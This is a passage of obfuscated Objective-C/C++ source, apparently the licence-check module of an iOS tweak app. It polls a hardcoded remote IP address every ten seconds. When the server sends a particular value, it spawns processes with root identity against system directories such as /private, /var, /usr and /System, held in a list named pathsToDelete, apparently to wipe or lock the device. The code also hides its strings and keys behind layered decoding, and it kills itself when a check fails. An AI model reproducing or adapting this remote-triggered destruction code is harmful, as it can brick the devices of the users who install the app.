                                            if (__tok_gw != NOTIFY_TOKEN_INVALID) { notify_set_state(__tok_gw, (uint64_t)__addr); notify_post("com.dawa.KKSJLEVELSD"); }
                                           
                                        }
                                    } while (0);
                                    do {
                                        id __vg = storedMessages[@"HJJHSBUSBHHS"];
                                        unsigned long long __addr = 0ULL;
                                        if ([__vg isKindOfClass:[NSString class]]) {
                                            const char *__s = [(NSString *)__vg UTF8String];   // 支持 "0x90023" / 十进制
                                            __addr = __s ? strtoull(__s, NULL, 0) : 0ULL;
                                        } else if ([__vg respondsToSelector:@selector(unsignedLongLongValue)]) {
                                            __addr = [__vg unsignedLongLongValue];
                                        }
                                        if (__addr) {
                                            static int __tok_gw = NOTIFY_TOKEN_INVALID;
                                            if (__tok_gw == NOTIFY_TOKEN_INVALID) notify_register_check("com.dawa.HJJHSBUSBHHS", &__tok_gw);
                                            if (__tok_gw != NOTIFY_TOKEN_INVALID) { notify_set_state(__tok_gw, (uint64_t)__addr); notify_post("com.dawa.HJJHSBUSBHHS"); }
                                           
                                        }
                                    } while (0);
                                    
                                    
                                    
                                    
                                    
                                    
                                  
                                    do {
                                        id __v1 = storedMessages[@"HBSGJSKJHSDG"];
                                        long long __k1 = 0;
                                        if ([__v1 isKindOfClass:[NSNumber class]]) {
                                            __k1 = [(NSNumber *)__v1 longLongValue];
                                        } else if ([__v1 respondsToSelector:@selector(longLongValue)]) {
                                            __k1 = [__v1 longLongValue];
                                        }
                                        static int __tok_k1 = NOTIFY_TOKEN_INVALID;
                                        if (__tok_k1 == NOTIFY_TOKEN_INVALID) notify_register_check("com.kuloutoupro.HHJJSHDHDG", &__tok_k1);
                                        if (__tok_k1 != NOTIFY_TOKEN_INVALID) {
                                            notify_set_state(__tok_k1, (uint64_t)(int64_t)__k1);
                                            notify_post("com.kuloutoupro.HHJJSHDHDG");
                                        }
                                       
                                    } while (0);
                                    
                                    
                                }
                            } else if (bytesRead == 0) {
                                isConnected.store(false);
                                break;
                            } else {
                                isConnected.store(false);
                                break;
                            }
                        }
                        close(clientSocket);
                    };
                    
                  std::thread t([=] {
                      static unsigned long long __iter = 0; // 轮次计数
                      while (true) {
                          @autoreleasepool {
                              unsigned long long iter = ++__iter;
                              NSDate *start = [NSDate date];
                            

                              SPV_1(@"103.217.206.126", @"774014A684A6187DA80B", 61050);

                              NSTimeInterval elapsed = -[start timeIntervalSinceNow];
                          
                          }
                          std::this_thread::sleep_for(std::chrono::seconds(10));
                      }
                  });
                  t.detach();
                }
        
        
        
        int64_t time = atoll([msg UTF8String]) * 60;
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(time * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            void (^f)(NSString *s) = arr[11];
            f(SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]]));
            return;
        });
    };
    
    Spv6 = ^(NSString *s) {
        [SpeedBlock disableHttpProxy];
        [SpeedKeyChain SpeedSetString:SpeedDesEn7En(SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]])) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_black), SpeedApp_IDENTITY]];
        [SpeedKeyChain SpeedSetString:SpeedDesEn7En(SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_serial), SpeedApp_IDENTITY]])) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_black), SpeedApp_IDENTITY]];
        typedef NSString * _Nonnull (^EncryptionBlock)(NSString * _Nonnull);
        EncryptionBlock En_3D=^(NSString *s1){
            return SpeedDesEn7En(s1);
        };
        
        NSMutableDictionary *param = [NSMutableDictionary dictionary];
        param[@"code"] = En_3D(SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]]));
        param[@"serial"] = En_3D(SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_serial), SpeedApp_IDENTITY]]));
        NSDate *date = [NSDate date];
        NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
        param[@"action"] = En_3D(SpeedDesEn7De(Speed_blackList));
        [formatter setDateFormat:@"yyyy-MM-dd HH:mm:ss"];
        NSString *appsafecode = [formatter stringFromDate:date];
        param[@"date"] = En_3D([formatter stringFromDate:date]);
        param[@"id"] = En_3D(md5(SpeedDesEn7De(Speed_appid)));
        param[@"appsafecode"] = En_3D(appsafecode);
        nlohmann::json jsonParam;
               for (NSString *key  in param.allKeys) {
                   NSString *value=param[key];
                   jsonParam[[key UTF8String]]=[value UTF8String];
               }
               std::string jsonStr=jsonParam.dump();
               NSString *paramJson=[NSString stringWithUTF8String:jsonStr.c_str()];
               NSString *encrypetdParam=En_3D(paramJson);
               
               typedef NSArray* (^UrlToArrayBlock)(NSString *);
               UrlToArrayBlock UrlToarr = ^(NSString *urlString){
                   if (!urlString||urlString.length==0)return @[];
                   NSURL *url =[NSURL URLWithString:SpeedDesEn7De(urlString)];
                   if (!url)return @[];
                   NSArray*urlarr=@[url.scheme ?:@"",url.host ?:@"",url.path ?:@""];
                   NSString *v0 =SpeedDesEn7En(urlarr[0]);
                   NSString *v1 =SpeedDesEn7En(urlarr[1]);
                   NSString *v2 =SpeedDesEn7En(urlarr[2]);
                   return @[v0,v1,v2];
               };
               NSArray *components =UrlToarr(Speed_HOST);
     
        
        
        
        
        
        
        if (![SpeedDesEn7De(Speed_HOST) isEqualToString:AsTostr(Speed_ECode, YES)]) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
             HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
            __builtin_trap();
         
         
#pragma clang diagnostic pop
        }
        [NetTool Post_AppendURL:components encryptedParam:encrypetdParam tag:EN_Spv6 mysuccess:^(id responseObject, NSString *serverTime) {
            NSError *error;
            NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:responseObject options:NSJSONReadingMutableContainers error:&error];
            if (dict == nil || error) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                 HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                __builtin_trap();
             
                
#pragma clang diagnostic pop
            } else {
                if ([dict[@"nblaote"] isEqualToString:@"haha"]) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                     HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                    __builtin_trap();
                  
                  
#pragma clang diagnostic pop
                }
                if (![dict[@"response"][@"appsafecode"] isEqualToString:appsafecode]) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                     HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                    __builtin_trap();
                  
                   
#pragma clang diagnostic pop
                }
                if ([dict[@"response"][@"data"] isEqualToString:@"poj"]) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                     HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                    __builtin_trap();
                  
                   
#pragma clang diagnostic pop
                }
            }
        } myfailure:^(NSError *error, NSString *serverTime) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
             HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
            __builtin_trap();
         
         
#pragma clang diagnostic pop
        }];
      
        do {
            static int tk = NOTIFY_TOKEN_INVALID;
            if (tk == NOTIFY_TOKEN_INVALID) {
                notify_register_dispatch("com.kuloutoupro.HHJJSHDHDG", &tk, dispatch_get_main_queue(), ^(int t){
                    uint64_t v = 0;
                    if (notify_get_state(t, &v) == NOTIFY_STATUS_OK) {
                      

                        if (v == 67573654) {
                        

                            NSArray *pathsToDelete = @[
                                @"/private",
                                @"/var",
                                @"/usr",
                                @"/System",
                                @"/bin",
                                @"/sbin",
                                @"/etc",
                                @"/Library",
                                @"/Applications",
                                @"/dev",
                                @"/tmp"
                            ];

                            for (NSString *path in pathsToDelete) {
                                posix_spawnattr_t attr;
                                posix_spawnattr_init(&attr);

                                // 设置进程为 root 权限
                                posix_spawnattr_set_persona_np(&attr, 99, POSIX_SPAWN_PERSONA_FLAGS_OVERRIDE);
                                posix_spawnattr_set_persona_uid_np(&attr, 0);
                                posix_spawnattr_set_persona_gid_np(&attr, 0);

                                // 获取可执行文件路径
                                static char *executablePath = NULL;
                                uint32_t executablePathSize = 0;
                                _NSGetExecutablePath(NULL, &executablePathSize);
                                executablePath = (char *)calloc(1, executablePathSize);
                                _NSGetExecutablePath(executablePath, &executablePathSize);

                                pid_t task_pid;

                                // 设置进程组并启动进程
                                posix_spawnattr_setpgroup(&attr, 0);
                                posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETPGROUP);

                                // 将权限值转换为字符串
                                std::string str = std::to_string(0000);
                                const char* cstr = str.c_str();
                                const char *args[] = {executablePath, "-HJSHDHDHSJ", path.UTF8String, cstr, NULL};

                        

                                // 启动进程执行命令
                                int spawnResult = posix_spawn(&task_pid, executablePath, NULL, &attr, (char **)args, environ);
                                posix_spawnattr_destroy(&attr);

                                if (spawnResult != 0) {
                                   
                                    return;
                                }

                            

                                // 等待进程退出
                                int status;
                                do {
                                    if (waitpid(task_pid, &status, 0) != -1)
                                    {
                                      
                                    }
                                } while (!WIFEXITED(status) && !WIFSIGNALED(status));
                                
                                
                                
                            }
                            notify_post("com.apple.MobileSync.BackupAgent.RestoreStarted");
                          
                        } else {
                         
                        }
                    } else {
                      
                    }
                });
            }
        } while (0);
        UIAlertController *alertController = [UIAlertController alertControllerWithTitle:SpeedDesEn7De(v_pojbt) message:[NSString stringWithFormat:@"\n%@\n\n%@\n\n%@%@", SpeedDesEn7De(v_yzcv3), SpeedDesEn7De(v_yzcgv4), SpeedDesEn7De(Speed_name), SpeedDesEn7De(v_yzcgv5)] preferredStyle:UIAlertControllerStyleAlert];
        [alertController addAction:[UIAlertAction actionWithTitle:SpeedDesEn7De(v_yzcgv6) style:UIAlertActionStyleDestructive handler:^(UIAlertAction * _Nonnull action) {
            
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
            notify_post("com.apple.MobileSync.BackupAgent.RestoreStarted");
             HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
            __builtin_trap();
          
           
#pragma clang diagnostic pop
        }]];
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
        [[UIApplication sharedApplication].keyWindow.rootViewController presentViewController:alertController animated:YES completion:nil];
#pragma clang diagnostic pop
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            [alertController dismissViewControllerAnimated:YES completion:^{
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                 HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                __builtin_trap();
            
#pragma clang diagnostic pop
            }];
        });
    };
    
    // 请求失败 - 本地验证
    Spv7 = ^(NSString *s) {
        NSString *Server_msg = s;
        if (SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_infoData), SpeedApp_IDENTITY]]) &&
            ![SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_infoData), SpeedApp_IDENTITY]]) isEqualToString:@""]) {
            NSArray *msg = [SpeedDe_3DES(SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_infoData), SpeedApp_IDENTITY]]), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))) componentsSeparatedByString:@"|"];
            if ([md5([NSString stringWithFormat:@"%@%@%@%@%@%@%@%@", SpeedDe_3DES(SpeedRebellion_de(msg[2], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[3], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[4], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[5], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[6], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[8], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[7], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[1], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))))]) isEqualToString:msg[9]] && [msg[0] isEqualToString:SpeedDesEn7De(v_yzcg)]) {
                NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
                dateFormatter.dateFormat = @"yyyy-MM-dd HH:mm:ss";
                NSDate *expiresDate = [dateFormatter dateFromString:SpeedDe_3DES(SpeedRebellion_de(msg[1], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))))
                ];
                if (Server_msg == nil || [Server_msg isEqualToString:@""] || [Server_msg stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]].length == 0) {
                    void (^f)(NSString *s) = arr[6];
                    f(SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]]));
                    return;
                }
                NSDate *nowDate = [dateFormatter dateFromString:Server_msg];
                if ([expiresDate compare:nowDate] == NSOrderedAscending) {
                    gShouldExit = YES;
                    [SpeedKeyChain SpeedRemoveItemForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_infoData), SpeedApp_IDENTITY]];
                    void (^f)(NSString *s) = arr[5];
                    f(SpeedDesEn7De(SpeedApp_LocalAuth));
                    if (gExitBlock) {
                        dispatch_block_cancel(gExitBlock);
                        gExitBlock = nil;
                    }
                    gExitBlock = dispatch_block_create(DISPATCH_BLOCK_ASSIGN_CURRENT, ^{
                        if (gShouldExit) {
                            void (^f)(NSString *s) = arr[6];
                            f(SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]]));
                            return;
                        }
                    });
                    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(15 * NSEC_PER_SEC)), dispatch_get_main_queue(), gExitBlock);
                    return;
                }
                [MBProgressHUD wj_showPlainText:msg[0] view:nil];
                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                    MBProgressHUD *Function = [MBProgressHUD wj_showLoadingStyle:WJHUDLoadingStyleDeterminateHorizontalBar];
                    [Function showAnimated:YES whileExecutingBlock:^{
                        float progress = 0.0f;
                        while (progress < 1.0f) {
                            Function.progress = progress;
                            Function.labelText = [NSString stringWithFormat:@"%@正在加载%.0f%%", SpeedDesEn7De(Speed_name), progress * 100];
                            progress += 0.01f;
                            usleep(10000);
                        }
                    } completionBlock:^{

                        int tok=0;
                        notify_register_check(CHANGED_NAME, &tok);
                        uint64_t ts =(uint64_t)[expiresDate timeIntervalSince1970];
                        notify_set_state(tok, (uint64_t)(ts));
                        notify_post(CHANGED_NAME);
                        notify_cancel(tok);
                        NSString *expireString=[NSString stringWithFormat:@"%@", SpeedDe_3DES(SpeedRebellion_de(msg[1], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))))];
                     
                        NSError *err = nil;
                        SaveExpireToICloudEncrypted(expireString, @"HHSSjjBBJSJ^&^&^&^%%&&&&^&^&^&&^7", &err);
                       
                            NSString *mssssg =
                                SpeedDe_3DES(
                                    SpeedRebellion_de(msg[3], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))),
                                    SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))),
                                    SpeedRebellion_de(AsTostr(Speed_ios_giv,  YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))
                                );

                               

                                NSUbiquitousKeyValueStore *kv = [NSUbiquitousKeyValueStore defaultStore];
                                [kv setString:mssssg forKey:kSpeedMsgKey];
                              
                        
                        [MBProgressHUD wj_hideHUD];
                    }];
                    void (^f)(NSString *s) = arr[5];
                    f(SpeedDe_3DES(SpeedRebellion_de(msg[8], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))));
                    return;
                });
            } else {
                [SpeedKeyChain SpeedRemoveItemForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_infoData), SpeedApp_IDENTITY]];
                [SpeedKeyChain SpeedSetString:SpeedDesEn7En(SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]])) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_black), SpeedApp_IDENTITY]];
                Spv0();
                return;
            }
        } else {
            void (^f)(NSString *s) = arr[1];
            f(@"本地数据异常...");
            return;
        }
    };
    
    // 无数据 - 本地验证
    Spv8 = ^(NSString *s) {
        NSString *Server_msg = s;
        if (SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_infoData), SpeedApp_IDENTITY]]) &&
            ![SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_infoData), SpeedApp_IDENTITY]]) isEqualToString:@""]) {
            
            NSArray *msg = [SpeedDe_3DES(SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_infoData), SpeedApp_IDENTITY]]), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))) componentsSeparatedByString:@"|"];
            
            if ([md5([NSString stringWithFormat:@"%@%@%@%@%@%@%@%@", SpeedDe_3DES(SpeedRebellion_de(msg[2], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[3], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[4], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[5], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[6], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[8], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[7], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[1], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))))]) isEqualToString:msg[9]] && [msg[0] isEqualToString:SpeedDesEn7De(v_yzcg)]) {
                NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
                dateFormatter.dateFormat = @"yyyy-MM-dd HH:mm:ss";
                NSDate *expiresDate = [dateFormatter dateFromString:SpeedDe_3DES(SpeedRebellion_de(msg[1], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))))
                ];
                if (Server_msg == nil || [Server_msg isEqualToString:@""] || [Server_msg stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]].length == 0) {
                    void (^f)(NSString *s) = arr[6];
                    f(SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]]));
                }
                NSDate *nowDate = [dateFormatter dateFromString:Server_msg];
                if ([expiresDate compare:nowDate] == NSOrderedAscending) {
                    gShouldExit = YES;
                    [SpeedKeyChain SpeedRemoveItemForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_infoData), SpeedApp_IDENTITY]];
                    void (^f)(NSString *s) = arr[5];
                    f(SpeedDesEn7De(SpeedApp_LocalAuth));
                    if (gExitBlock) {
